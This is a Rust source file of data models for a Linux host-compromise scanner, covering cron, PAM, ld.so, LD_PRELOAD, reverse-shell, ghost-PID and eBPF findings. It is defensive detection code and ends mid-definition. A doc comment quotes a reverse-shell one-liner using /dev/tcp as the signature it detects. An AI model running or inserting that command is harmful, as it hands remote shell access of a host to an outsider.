use serde::{Deserialize, Serialize};

fn default_scoring_version() -> u8 {
    1
}
fn one() -> u32 {
    1
}

/// Result of the mapper's self‑integrity preflight (R11 audit – Fable).
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct SelfIntegrityReport {
    pub compromised: bool,
    #[serde(default)]
    pub warnings: Vec<String>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct AgentReport {
    pub scan_id: String,
    pub timestamp: String,
    pub version: String,
    pub duration_secs: f64,
    pub risk_score: u8,
    pub is_root_execution: bool,
    pub scan_warnings: Vec<String>,
    #[serde(default)]
    pub coverage_warnings: Vec<String>,
    #[serde(default)]
    pub failed_scanners: Vec<String>,
    /// How the scan was executed. `None` = local scan or legacy snapshot;
    /// `Some(false)` = remote scan that ran WITHOUT root — privileged surfaces
    /// were not read and a low score is not evidence of health.
    #[serde(default)]
    pub remote_privileged: Option<bool>,
    #[serde(default = "default_scoring_version")]
    pub scoring_version: u8,
    /// Self‑integrity preflight result. None = check not performed or legacy snapshot.
    #[serde(default)]
    pub self_integrity: Option<SelfIntegrityReport>,
    pub host: HostInfo,
    pub databases: Vec<DatabaseInfo>,
    pub network: NetworkInfo,
    pub storage: StorageInfo,
    pub topology: TopologyInfo,
    pub security: SecurityInfo,
    pub packages: PackagesInfo,
}

impl AgentReport {
    /// Whether this scan was able to read privileged surfaces.
    ///
    /// The host's `is_root_execution` is ground truth. `remote_privileged`
    /// is what the orchestrator intended to run. Where they disagree, the
    /// host wins: sudo can exit 0 and still not yield root (sudoers wrapper,
    /// `Defaults targetpw`, `runas`). Preferring intent would mark an
    /// unprivileged scan as full coverage (R25-86).
    pub fn scan_was_privileged(&self) -> bool {
        self.is_root_execution && self.remote_privileged.unwrap_or(true)
    }

    /// The orchestrator's belief about privilege disagrees with the host's
    /// ground truth (`is_root_execution`). True in BOTH directions:
    /// - orchestrator thought sudo worked but the scan was not root;
    /// - orchestrator thought sudo was unavailable but the scan WAS root
    ///   (false-negative sudo probe, R25-99).
    pub fn privilege_claim_disagrees(&self) -> bool {
        match self.remote_privileged {
            Some(true) => !self.is_root_execution,
            Some(false) => self.is_root_execution,
            None => false,
        }
    }
}

impl Default for AgentReport {
    fn default() -> Self {
        Self {
            scan_id: String::new(),
            timestamp: String::new(),
            version: String::new(),
            duration_secs: 0.0,
            risk_score: 0,
            is_root_execution: false,
            scan_warnings: Vec::new(),
            coverage_warnings: Vec::new(),
            scoring_version: 1,
            self_integrity: None,
            host: HostInfo::default(),
            databases: Vec::new(),
            network: NetworkInfo::default(),
            storage: StorageInfo::default(),
            topology: TopologyInfo::default(),
            security: SecurityInfo::default(),
            packages: PackagesInfo::default(),
            failed_scanners: Vec::new(),
            remote_privileged: None,
        }
    }
}

// ---------------------------------------------------------------------------
// Cron severity classification (shared between scanner and scoring)
// ---------------------------------------------------------------------------

/// Severity of a cron job based on its content.
#[derive(Serialize, Deserialize, Debug, Clone, PartialEq, Eq, Default)]
pub enum CronSeverity {
    /// No suspicious patterns found.
    #[default]
    Ok,
    /// Uses custom paths or tools that may be legitimate but should be reviewed.
    Warning,
    /// Contains clear indicators of compromise (reverse shells, downloads, etc.).
    Critical,
}

/// A single cron job with its classification.
#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct CronJob {
    pub command: String,
    pub severity: CronSeverity,
}

// ---------------------------------------------------------------------------
// HostInfo
// ---------------------------------------------------------------------------

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
#[serde(default)]
pub struct HostInfo {
    pub hostname: String,
    pub external_ipv4: String,
    pub hosting_provider: String,
    pub os_install_date: String,
    pub os_version: String,
    pub kernel: String,
    pub uptime_days: u64,
    pub reboot_required: bool,
    pub cpu_cores: usize,
    pub total_ram_mb: u64,
    pub swap_total_mb: u64,
    pub swap_used_mb: u64,
    pub load_average: (f64, f64, f64),
    pub open_files_limit: String,
    pub oom_kills: usize,
    pub zombie_processes: usize,
    pub security_modules: Vec<String>,
    pub dmesg_errors: Vec<String>,
    pub gpu_devices: Vec<String>,
    pub native_services: Vec<String>,

    /// Cron jobs collected from the system, each classified by severity.
    pub cron_jobs: Vec<CronJob>,

    pub systemd_timers: Vec<String>,
    pub tech_stack: Vec<String>,
    pub top_memory_processes: Vec<ProcessInfo>,
    pub failed_services: Vec<String>,
    pub backup_tools: Vec<String>,
    pub last_restic_snapshot: Option<String>,
    pub ntp_synchronized: bool,
    pub time_offset_ms: Option<f64>,
    pub reboot_required_pkgs: Vec<String>,
    pub zombie_details: Vec<ZombieInfo>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct ProcessInfo {
    pub name: String,
    pub pid: u32,
    pub memory_mb: u64,
    #[serde(default = "one")]
    pub instances: u32,
}

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct ZombieInfo {
    pub pid: u32,
    pub name: String,
    pub ppid: u32,
    pub parent_name: String,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct DatabaseInfo {
    pub engine: String,
    pub version: String,
    pub data_dir: String,
    pub size_mb: u64,
}

// R26-11: container-level serde(default) for backward-compatible JSON reads.
#[derive(Serialize, Deserialize, Debug, Clone, Default)]
#[serde(default)]
pub struct NetworkInfo {
    pub firewall_active: bool,
    pub dns_resolvers: Vec<String>,
    pub custom_host_overrides: Vec<String>,
    pub ssl_certificates: Vec<SslCertInfo>,
    pub listening_ports: Vec<PortInfo>,
    #[serde(default)]
    pub dns_upstreams: Vec<String>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct SslCertInfo {
    pub domain: String,
    pub expiry_date: String,
    pub days_remaining: Option<i64>,
    pub is_critical: bool,
    pub is_warning: bool,
}

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
#[serde(default)]
pub struct PortInfo {
    pub protocol: String,
    pub port: String,
    pub process: String,
    pub bind_address: String,
    #[serde(default)]
    pub pid: Option<u32>,
    #[serde(default)]
    pub exe_path: Option<String>,
}

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct StorageInfo {
    pub disks: Vec<DiskInfo>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct DiskInfo {
    pub mount_point: String,
    pub total_mb: u64,
    pub used_mb: u64,
    pub usage_pct: f64,
    pub inode_usage_percent: Option<String>,
}

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct TopologyInfo {
    pub runtime_active: bool,
    #[serde(default)]
    pub runtime_name: String,
    pub images_count: usize,
    pub dangling_images_count: usize,
    pub total_images_size_mb: u64,
    pub total_dangling_size_mb: u64,
    pub dangling_volumes_count: usize,
    pub dangling_images: Vec<DanglingImageInfo>,
    pub containers: Vec<ContainerInfo>,
    #[serde(default)]
    pub images_reclaimable_mb: u64,
    #[serde(default)]
    pub build_cache_reclaimable_mb: u64,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct DanglingImageInfo {
    pub id: String,
    pub size_mb: u64,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct ContainerInfo {
    pub name: String,
    pub image: String,
    pub state: String,
    pub status: String,
    pub size_mb: u64,
    pub log_size_mb: u64,
    pub ports: Vec<String>,
    pub mounts: Vec<String>,
    pub privileged: bool,
    pub memory_limit_mb: Option<u64>,
    pub cpu_limit: Option<f64>,
    pub cap_add: Vec<String>,
    #[serde(default)]
    pub sensitive_mounts: Vec<String>,
    #[serde(default)]
    pub restart_count: u64,
    #[serde(default)]
    pub oom_killed: bool,
    #[serde(default)]
    pub health_status: Option<String>,
    #[serde(default)]
    pub rw_size_mb: u64,
    /// Live CapBnd of the container's init process (host pid), read from the
    /// kernel at scan time. None = container not running or /proc unreadable
    /// (non-root scan). Ground truth for the DOCK-010 runtime-tamper delta.
    #[serde(default)]
    pub runtime_bounding_caps: Option<u64>,
}

impl ContainerInfo {
    pub fn security_issues(&self) -> Vec<&'static str> {
        let mut issues = Vec::new();
        if self.privileged {
            issues.push("PRIVILEGED");
        }
        if self.memory_limit_mb.is_none() {
            issues.push("NoMemLimit");
        }
        if self.cpu_limit.is_none() {
            issues.push("NoCpuLimit");
        }
        if self.cap_add.contains(&"SYS_ADMIN".to_string()) {
            issues.push("SYS_ADMIN");
        }
        if self.cap_add.contains(&"NET_ADMIN".to_string()) {
            issues.push("NET_ADMIN");
        }
        issues
    }
}

// ── Provenance source (moved from provenance.rs for model visibility) ──

#[derive(Serialize, Deserialize, Debug, Clone, Copy, PartialEq, Eq, Default)]
#[serde(rename_all = "snake_case")]
pub enum ProvenanceSource {
    /// Debian / Ubuntu database was used.
    Dpkg,
    /// Alpine database was used.
    Apk,
    /// Alpine database was used but the file was truncated at the read cap.
    PartialApk,
    /// RPM database was queried via rpm tool.
    Rpm,
    /// No parseable database (pacman, or missing DB).
    #[default]
    Unavailable,
}

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
#[serde(default)]
pub struct SecurityInfo {
    pub ssh_password_auth_enabled: bool,
    pub ssh_root_login_enabled: bool,
    #[serde(default)]
    pub ssh_permit_root_login_detail: Option<String>,
    pub shell_users: Vec<UserInfo>,
    pub fail2ban_active: bool,
    pub auditd_active: bool,
    pub ssh_config_source: String,
    pub sudo_nopasswd_entries: Vec<String>,
    pub sudoers_mode: Option<u32>,
    pub sysctl_issues: Vec<String>,
    #[serde(default)]
    pub access_alignment: AccessAuditResult,
    #[serde(default)]
    pub secret_hygiene: Vec<SecretLeak>,
    #[serde(default)]
    pub capability_audit: Vec<ProcCapFinding>,
    #[serde(default)]
    pub suspicious_processes: Vec<SuspiciousProcess>,
    #[serde(default)]
    pub mount_masking: Vec<MountMaskingFinding>,
    #[serde(default)]
    pub reverse_shells: Vec<ReverseShellFinding>,
    #[serde(default)]
    pub library_injections: Vec<LibraryInjectionFinding>,
    #[serde(default)]
    pub ghost_pids: Vec<GhostPidFinding>,
    /// Files with persistent capabilities (setcap).
    #[serde(default)]
    pub file_capabilities: Vec<FileCapFinding>,
    /// eBPF inventory – loaded programs, maps, and pinned objects.
    #[serde(default)]
    pub ebpf_inventory: EbpfInventory,
    /// Setuid/setgid files found in common binary directories.
    #[serde(default)]
    pub setuid_files: Vec<SetuidFinding>,
    /// Which package database was used for provenance attribution.
    /// Crosses the SSH boundary so the orchestrator can distinguish
    /// “file not owned by any package” from “could not check”.
    #[serde(default)]
    pub provenance_source: ProvenanceSource,

    // ── NEW FIELDS (SEC-038/039/040) ──
    /// Decoded kernel taint mask (SEC-038).
    #[serde(default)]
    pub kernel_taint: KernelTaint,
    /// LSM confinement state and downgrades (SEC-039).
    #[serde(default)]
    pub confinement: ConfinementReport,
    /// Kernel module inventory + hidden-module reconciliation (SEC-040).
    #[serde(default)]
    pub kernel_modules: KernelModuleInventory,
    /// ftrace/kprobe hook surface on syscall entries (SEC-041).
    #[serde(default)]
    pub ftrace_hooks: FtraceHookInventory,

    // ── SEC-042: system-wide LD_PRELOAD via /etc/ld.so.preload ─────────
    /// Entries found in /etc/ld.so.preload (system-wide library injection).
    #[serde(default)]
    pub preload_injections: Vec<PreloadFinding>,

    // ── SEC-044: kernel security facts (core_pattern, modules_disabled, lockdown) ─
    #[serde(default)]
    pub core_pattern: Option<String>,
    #[serde(default)]
    pub modules_disabled: Option<bool>, // None = unreadable
    #[serde(default)]
    pub lockdown: Option<String>, // None = not available

    // ── SEC-043: ExecStart provenance for systemd units and cron ─
    #[serde(default)]
    pub exec_start_injections: Vec<ExecStartFinding>,

    // ── SEC-051: ld.so.conf.d library path injection ───────────────────────
    /// Directories from /etc/ld.so.conf and /etc/ld.so.conf.d/*.conf that
    /// are writable by non-root or reside on volatile filesystems.
    #[serde(default)]
    pub ld_so_conf_injections: Vec<LdSoConfInjection>,

    // ── SEC-052/053/054: systemd generator persistence ─────────────────────
    /// Executables in systemd's generator search paths, plus the search
    /// directories themselves when they are writable by a non-root principal.
    #[serde(default)]
    pub generators: Vec<GeneratorFinding>,

    // ── One-way kernel switches (R23-08 extension) ─
    /// Values of sysctls that cannot be weakened without a reboot.
    /// `None` = unreadable (coverage); keyed by stable human label
    /// (no spaces, jq‑friendly).
    #[serde(default)]
    pub one_way_switches: std::collections::BTreeMap<String, Option<u8>>,

    // ── SEC-055/056/057: PAM stack injection ──────────────────────────────
    #[serde(default)]
    pub pam_injections: Vec<PamFinding>,
}

// ═══════════════════════════════════════════════════════════════════════════
// SEC-051: ld.so.conf.d injection
// ═══════════════════════════════════════════════════════════════════════════

/// A directory listed in ld.so.conf (or an included conf.d fragment) that is
/// unsafe — either writable by a non-root user or backed by a volatile
/// filesystem. Such a directory allows an unprivileged local attacker to
/// inject a shared library that takes precedence over system libraries via
/// ld.so.cache.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LdSoConfInjection {
    /// The path as written in the config file.
    pub path: String,
    /// True if the filesystem is volatile (tmpfs, devtmpfs, etc.).
    pub volatile: bool,
    /// True if the directory is writable by a non-root principal (owner/group
    /// write for non-root, or world-writable).
    pub writable_by_non_root: bool,
    /// POSIX mode bits of the directory in octal (e.g. 0o755).  Null if stat failed.
    #[serde(default)]
    pub mode: Option<u32>,
    /// Owner UID of the directory.
    #[serde(default)]
    pub uid: u32,
    /// Owner GID of the directory.
    #[serde(default)]
    pub gid: u32,
}

// ═══════════════════════════════════════════════════════════════════════════
// SEC-052/053/054: systemd generators
// ═══════════════════════════════════════════════════════════════════════════

/// Where the generator was found. systemd.generator(7) reserves
/// /usr/lib/systemd/*-generators for the package manager; everything else is
/// administrator or runtime territory. This is the DB-free authorship signal,
/// same reasoning as `unit_path_is_vendor_dir` for SEC-043.
#[derive(Serialize, Deserialize, Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum GeneratorOrigin {
    /// /usr/lib/systemd/{system,user}-generators — package manager only.
    #[default]
    Vendor,
    /// /usr/local/lib/systemd/... — local build, not vendor-owned.
    LocalAdmin,
    /// /etc/systemd/... — administrator.
    Admin,
    /// /run/systemd/... — runtime, disappears on reboot.
    Runtime,
}

/// What the record describes.
#[derive(Serialize, Deserialize, Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum GeneratorKind {
    /// An executable systemd will run at boot and on every daemon-reload.
    #[default]
    Executable,
    /// A search directory that a non-root principal can write to — the
    /// opportunity itself, reported even when the directory is empty.
    SearchDir,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct GeneratorFinding {
    /// Absolute path of the executable, or of the directory for `SearchDir`.
    pub path: String,
    #[serde(default)]
    pub kind: GeneratorKind,
    #[serde(default)]
    pub origin: GeneratorOrigin,
    /// Owning package, if the provenance backend could attribute it.
    #[serde(default)]
    pub package: Option<String>,
    /// Shared vocabulary with SEC-043 — one enum for "who controls these bytes".
    #[serde(default)]
    pub writability: ExecWritability,
    /// Symlink target as written, if the entry is a link. systemd ships several
    /// generators as links; a link leaving the systemd hierarchy is a signal.
    #[serde(default)]
    pub symlink_target: Option<String>,
    /// Fully resolved path (symlinks followed). None if the link dangles.
    #[serde(default)]
    pub resolved_path: Option<String>,
    #[serde(default)]
    pub uid: u32,
    #[serde(default)]
    pub gid: u32,
}

// ═══════════════════════════════════════════════════════════════════════════
// SEC-055/056/057: PAM stack injection
// ═══════════════════════════════════════════════════════════════════════════

/// One line from a PAM service configuration.
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct PamModule {
    pub module_path: String,
}

/// What kind of PAM object a finding describes.
#[derive(Serialize, Deserialize, Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum PamTargetKind {
    /// A shared object (.so) loaded by the PAM stack.
    #[default]
    Module,
    /// An external script executed by pam_exec (or similar modules).
    ExecScript,
    /// The PAM service configuration file itself (writable by non‑root) –
    /// an attacker who can write to this file can inject arbitrary modules.
    Config,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct PamFinding {
    /// List of PAM service files that reference this module (e.g. "sshd (auth sufficient)").
    #[serde(default)]
    pub services: Vec<String>,
    /// The suspicious module line.
    #[serde(flatten)]
    pub module: PamModule,
    #[serde(default)]
    pub writability: ExecWritability,
    #[serde(default)]
    pub volatile: bool,
    /// Owning package, if resolved.
    #[serde(default)]
    pub package: Option<String>,
    /// Owner UID of the target. `None` = stat(2) failed or the file is absent —
    /// explicitly UNKNOWN, never silently 0/root (R24-09).
    #[serde(default)]
    pub uid: Option<u32>,
    /// Owner GID of the target. `None` = stat(2) failed or the file is absent —
    /// explicitly UNKNOWN, never silently 0/root (R24-09).
    #[serde(default)]
    pub gid: Option<u32>,
    /// Whether the parent directory of the module path can be taken over
    /// by a non-root user (for Missing modules).
    #[serde(default)]
    pub parent_takeable: bool,
    /// What kind of target this is (module or exec script).
    #[serde(default)]
    pub target_kind: PamTargetKind,
    /// The path exactly as written in the PAM configuration file, if it differs
    /// from the resolved module_path (e.g. due to ".." or symlink).  Helps
    /// the analyst locate the line in /etc/pam.d.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub declared_as: Option<String>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct UserInfo {
    pub username: String,
    pub last_login: String,
    pub last_ssh_login: String,
    pub authorized_keys_count: usize,
}

#[derive(Serialize, Debug, Clone, Copy, PartialEq, Default)]
pub enum PackageManager {
    Apt,
    Dnf,
    Yum,
    Pacman,
    Zypper,
    #[default]
    Unknown,
}

impl<'de> Deserialize<'de> for PackageManager {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: serde::Deserializer<'de>,
    {
        let s = String::deserialize(deserializer)?;
        Ok(match s.as_str() {
            "Apt" => PackageManager::Apt,
            "Dnf" => PackageManager::Dnf,
            "Yum" => PackageManager::Yum,
            "Pacman" => PackageManager::Pacman,
            "Zypper" => PackageManager::Zypper,
            _ => PackageManager::Unknown,
        })
    }
}

impl PackageManager {
    pub fn is_known(&self) -> bool {
        !matches!(self, PackageManager::Unknown)
    }
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct UpgradablePackage {
    pub name: String,
    pub current_version: String,
    pub new_version: String,
    pub is_security: bool,
}

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct PackagesInfo {
    pub manager: PackageManager,
    pub installed_count: usize,
    pub upgradable: Vec<UpgradablePackage>,
    pub cache_refreshed: bool,
}

// Diff model (compare v2)

#[derive(Debug, Clone, Serialize)]
pub struct SnapshotMeta {
    pub hostname: String,
    pub timestamp: String,
    pub version: String,
    pub scoring_version: u8,
    pub risk_score: u8,
}

impl SnapshotMeta {
    pub fn from_report(r: &AgentReport) -> Self {
        Self {
            hostname: r.host.hostname.clone(),
            timestamp: r.timestamp.clone(),
            version: r.version.clone(),
            scoring_version: r.scoring_version,
            risk_score: r.risk_score,
        }
    }
}

#[derive(Debug, Clone, Serialize, PartialEq)]
pub enum HostDiffStatus {
    Compared,
    Added,
    Removed,
}

#[derive(Debug, Clone, Serialize)]
pub struct DiffReport {
    pub before: Option<SnapshotMeta>,
    pub after: Option<SnapshotMeta>,
    pub changes: Vec<Change>,
}

#[derive(Debug, Clone, Serialize)]
pub struct Change {
    pub field: String,
    pub before: Option<String>,
    pub after: Option<String>,
    pub severity: Severity,
}

#[derive(Debug, Clone, Serialize, PartialEq)]
pub enum Severity {
    Improved,
    Degraded,
    Changed,
}

#[derive(Debug, Clone, Serialize)]
pub struct MultiHostDiff {
    pub hostname: String,
    pub status: HostDiffStatus,
    pub diff: DiffReport,
}

// IAM & Access Alignment Models

#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
pub struct SshKeyAudit {
    pub user: String,
    pub algorithm: String,
    pub bits: u32,
    pub comment: String,
    pub compliant: bool,
    pub reason: Option<String>,
}

#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
pub struct SudoersEntry {
    pub principal: String,
    pub source_file: String,
    pub scope: String,
}

#[derive(serde::Serialize, serde::Deserialize, Debug, Clone, Default)]
pub struct AccessAuditResult {
    #[serde(default)]
    pub keys: Vec<SshKeyAudit>,
    #[serde(default)]
    pub coverage_warnings: Vec<String>,
    #[serde(default)]
    pub sudoers_nopasswd_all: Vec<SudoersEntry>,
}

// DLP & Secret Hygiene Models

#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
pub struct SecretLeak {
    pub pid: u32,
    pub process: String,
    pub source: String,
    pub matched_key: String,
}

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct SuspiciousProcess {
    pub pid: u32,
    pub name: String,
    #[serde(default)]
    pub exe_path: Option<String>,
    #[serde(default)]
    pub is_deleted: bool,
    #[serde(default)]
    pub euid: u32,
    #[serde(default)]
    pub is_mimic: bool,
    /// Non-None = this record is the scanner's own process, attributed by a PID
    /// identity established inside this process. The record is NEVER dropped
    /// (Raw Truth); the string is the reason surfaced as SEC-032.
    ///
    /// Read ONLY by the footprint class (SEC-017/SEC-019). Injection-class
    /// findings (SEC-023/026/028/029) must ignore this field: an implant in our
    /// own address space is exactly what we must not go blind to.
    /// `serde(default)` ⇒ legacy snapshots deserialize to None ⇒ pre-R12
    /// behaviour preserved on `compare`.
    #[serde(default)]
    pub self_attributed: Option<String>,
}

// ── Process Capability Audit Models ──────────────────────────────────────

/// Typed reason for a process capability finding.
/// Replaces the brittle string literal used previously (R20‑03).
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "snake_case")]
pub enum CapReason {
    /// Ambient capabilities held without NoNewPrivs (CAP-002).
    AmbientCapsNoNewPrivs,
}

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct ProcCapFinding {
    pub pid: u32,
    pub comm: String,
    pub euid: u32,
    pub effective: u64,
    pub permitted: u64,
    pub inheritable: u64,
    pub bounding: u64,
    #[serde(default)]
    pub ambient: u64,
    /// None = line absent (kernel < 4.10) or snapshot predates this field.
    #[serde(default)]
    pub no_new_privs: Option<bool>,
    /// 0 disabled / 1 strict / 2 filter; None = no CONFIG_SECCOMP or old snapshot.
    #[serde(default)]
    pub seccomp: Option<u8>,
    pub critical_caps: Vec<String>,
    /// Reason for this finding (e.g. AmbientCapsNoNewPrivs).
    #[serde(default)]
    pub reason: Option<CapReason>,
}

// Bind‑mount / overlay masking (SEC‑021)

/// A mount point that appears to hide something a defender would want to see:
/// a `/proc/<pid>` overlay (process hiding) or a tmpfs/bind overlay on top of
/// a log or container-log path (evidence hiding). Parsed from
/// `/proc/self/mountinfo`.
#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct MountMaskingFinding {
    /// Mount point being masked (mountinfo field 5), e.g. `/proc/1234`.
    pub target_path: String,
    /// Mount source (mountinfo post-separator field 2), e.g. `tmpfs`, `/dev/sda1`.
    pub mount_source: String,
    /// Filesystem type (mountinfo post-separator field 1), e.g. `tmpfs`, `ext4`.
    pub fstype: String,
    /// Why this was flagged, for the evidence string (e.g. `hidden PID`,
    /// `tmpfs over /var/log`, `bind overlay on /var/log`).
    #[serde(default)]
    pub reason: String,
}

// Reverse-shell / C2 correlation (SEC-022)

/// An interactive interpreter (bash, python, nc, socat, …) holding an
/// ESTABLISHED outbound TCP socket to a public remote address, with that
/// socket wired to one of its stdio fds (0/1/2). This is the signature of a
/// classic reverse shell (`bash -i >& /dev/tcp/host/port 0>&1`), correlated
/// from `/proc/net/tcp{,6}` (established) × `/proc/<pid>/fd`.
#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct ReverseShellFinding {
    pub pid: u32,
    /// Process comm (the interpreter name that matched the shell allowlist).
    pub process: String,
    /// Resolved executable path, if readable.
    #[serde(default)]
    pub exe_path: Option<String>,
    /// Remote endpoint the socket is connected to, `ip:port`.
    pub remote_address: String,
    /// Which stdio fd carried the socket: 0=stdin, 1=stdout, 2=stderr.
    /// None = socket held on a non-stdio fd (weaker, still reported).
    #[serde(default)]
    pub stdio_fd: Option<u8>,
}

// Userspace rootkit / library injection (SEC-023)

/// Evidence that a process has a shared object injected from a writable or
/// ephemeral location — the signature of a userspace rootkit / LD_PRELOAD
/// implant (libprocesshider, Azazel, Jynx). Sourced from `/proc/<pid>/environ`
/// (LD_PRELOAD / LD_LIBRARY_PATH pointing at an ephemeral path) and
/// `/proc/<pid>/maps` (a file-backed .so actually mapped from such a path).
#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct LibraryInjectionFinding {
    pub pid: u32,
    /// Process comm, for the evidence string.
    pub process: String,
    /// The offending path (the .so or the LD_* value).
    pub object_path: String,
    /// Where it was observed: "LD_PRELOAD", "LD_LIBRARY_PATH", or "maps".
    pub source: String,
    /// True when the mapped object is marked "(deleted)" — a stronger IoC
    /// (implant unlinked to hide from disk inspection).
    #[serde(default)]
    pub is_deleted: bool,
    /// VMA start-end address ("7f3c0000-7f3d0000") — forensic anchor for investigation.
    #[serde(default)]
    pub region_addr: Option<String>,
    /// Deep memory forensics payload (only present with `--deep`).
    /// `None` in fast‑path; silently omitted from JSON when absent.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub deep_forensics: Option<DeepMemoryAnalysis>,
    /// Absolute path of the executable (/proc/pid/exe) — reputation through
    /// provenance/cache. NOT derived from the failable process name.
    #[serde(default)]
    pub exe_path: Option<String>,
}

// ---------------------------------------------------------------------------
// Injection classification (single source of truth for policy)
// ---------------------------------------------------------------------------

/// Classification of a library injection finding used for scoring and display.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum InjectionClass {
    /// Classic injections: LD_*, ephemeral .so (SEC-023 Critical)
    ClassicInjection,
    /// Suspicious executable memory: isolated rwx, exec-stack, exec-heap (SEC-026 Warning)
    MemoryAnomaly,
    /// Expected JIT/interpreter behavior: JIT code cache, W^X hardening gaps (SEC-027 Info)
    JitAdvisory,
}

impl LibraryInjectionFinding {
    pub fn classify(&self) -> InjectionClass {
        if self.source == "maps" || self.source.starts_with("LD_") {
            InjectionClass::ClassicInjection
        } else if self.source.starts_with("maps-rwx-jit")
            || self.source.starts_with("maps-rx-jit")
            || self.source == "maps-so-jit-extract"
            || self.source == "maps-so-tmp-unverified"
            || self.source == "maps-so-unlink-on-load"
            || self.source == "maps-rwx-cached-clean"
            || self.source == "maps-rwx-provisional"
            || self.source == "maps-rwx-runtime-allowlist"
            || self.source.ends_with("-jit")
        {
            InjectionClass::JitAdvisory
        } else {
            InjectionClass::MemoryAnomaly
        }
    }
}

// True Ghost PID — LKM rootkit process hiding (SEC-024)

/// A PID that is live via direct `/proc/<pid>` stat AND/OR `kill(pid,0)` but is
/// absent from the `readdir("/proc")` listing across multiple probe cycles —
/// the signature of a getdents64-hooking LKM rootkit (Diamorphine class).
/// `confirmed_ioc` distinguishes a hard IoC (survived all cycles, age ≥ 2s,
/// live state) from a downgraded suspicion (young/racy/unconfirmable).
#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct GhostPidFinding {
    pub pid: u32,
    /// Process state from /proc/<pid>/stat (R/S/D/Z/…), if readable.
    #[serde(default)]
    pub state: Option<String>,
    /// Age in seconds derived from starttime, if computable.
    #[serde(default)]
    pub age_secs: Option<u64>,
    /// How existence was confirmed: "stat-path", "kill", or "stat-path+kill".
    /// A "kill"-only confirmation with stat-path ENOENT indicates a rootkit
    /// hiding the direct /proc path too (advanced variant).
    pub confirmed_via: String,
    /// True = hard IoC (exit-3 eligible); false = downgraded suspicion.
    #[serde(default)]
    pub confirmed_ioc: bool,
    /// Corroboration: this hidden PID also owns a network socket.
    #[serde(default)]
    pub holds_socket: bool,
}

// ── File Capability Inventory (R16) ──

/// A file that has been granted capabilities via extended attributes
/// (e.g. `setcap cap_net_bind_service+ep /usr/bin/node`).
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct FileCapFinding {
    pub path: String,
    /// Human‑readable capability names (e.g. "CAP_NET_BIND_SERVICE")
    pub capabilities: Vec<String>,
    /// Why this finding was flagged, for the evidence string
    #[serde(default)]
    pub reason: Option<String>,
    // R17-07: raw capability masks and metadata
    #[serde(default)]
    pub permitted: u64,
    #[serde(default)]
    pub inheritable: u64,
    #[serde(default)]
    pub effective: bool,
    #[serde(default)]
    pub revision: u8,
    #[serde(default)]
    pub rootid: Option<u32>,
    /// Name of the installed package that owns this file, resolved at scan time.
    /// `None` + `provenance_source == Unavailable` → could not check.
    /// `None` + `provenance_source != Unavailable` → file is NOT from a package.
    #[serde(default)]
    pub package: Option<String>,
}

// ── Setuid/Setgid Inventory (R17) ─────────────────────────────────────────

/// A file with setuid or setgid permission bits.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct SetuidFinding {
    pub path: String,
    pub setuid: bool,
    pub setgid: bool,
    pub root_owner: bool,
    /// Name of the installed package that owns this file, resolved at scan time.
    #[serde(default)]
    pub package: Option<String>,
}

// ── eBPF Inventory (R17) ─────────────────────────────────────────────────

/// A loaded BPF program attached to a process.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct BpfProgInfo {
    pub prog_id: u32,
    pub prog_type: String,
    pub prog_name: Option<String>,
    pub prog_tag: String,
    pub pid: u32,
    pub comm: String,
}

/// A BPF map used by a process.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct BpfMapInfo {
    pub map_id: u32,
    pub map_type: String,
    pub pid: u32,
    pub comm: String,
}

/// A pinned BPF object visible in /sys/fs/bpf.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct BpfPinInfo {
    pub path: String,     // path in /sys/fs/bpf
    pub obj_type: String, // "prog", "map", "link"
    pub obj_id: u32,
}

/// A loaded BPF link (attachment) associated with a process.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct BpfLinkInfo {
    pub link_id: u32,
    pub prog_id: u32,
    pub attach_type: String,
    pub pid: u32,
    pub comm: String,
}

/// Full eBPF inventory collected from /proc and /sys/fs/bpf.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct EbpfInventory {
